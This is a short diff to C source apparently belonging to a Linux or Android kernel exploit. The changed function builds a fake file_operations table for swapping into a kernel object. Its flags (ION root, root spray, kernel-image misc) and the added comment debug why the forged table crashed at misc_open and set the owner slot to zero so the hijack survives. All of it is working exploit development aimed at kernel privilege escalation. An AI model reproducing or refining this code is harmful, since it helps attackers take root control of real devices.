@@ -496,7 +496,14 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
    * avoided rebalance. Force empty black leaf shell [0:0x18) for ARISTOTLE.
    * .write stays at +0x18 (past rb_node) for FMODE_CAN_WRITE after swap.
    */
-  int rb_leaf = env_flag("MODE4_FOPS_RB_LEAF", 0) ||
+  /*
+   * SLIDE_SWAP never wants the shell: the table IS the swapped fops.
+   * Shell +0x00=1 lands in the fops OWNER slot — misc_open's fops_get()
+   * -> try_module_get((struct module*)1) faults instantly (SS1 + R2
+   * both died at first open regardless of slide; owner=0 is the fix).
+   */
+  int slide_swap_tbl = env_flag("MODE4_SLIDE_SWAP", 0);
+  int rb_leaf = (env_flag("MODE4_FOPS_RB_LEAF", 0) ||
                 env_flag("MODE4_ION_SAFE", 0) ||
                 env_flag("MODE4_ION_ROOT", 0) ||
                 env_flag("MODE4_ROOT_SPRAY", 0) ||
@@ -511,7 +518,7 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
                 env_flag("MODE4_FOPS_SLOT", 0) ||
                 env_flag("MODE4_KIMAGE_MISC", 0) ||
                 env_flag("MODE4_P0_MISC", 0) ||
-                env_flag("MODE4_PAD3", 0);
+                env_flag("MODE4_PAD3", 0)) && !slide_swap_tbl;
   if (rb_leaf) {
     put64(p, off + 0x00, 1); /* BLACK, parent NULL */
     put64(p, off + 0x08, 0); /* rb_right / llseek NULL */
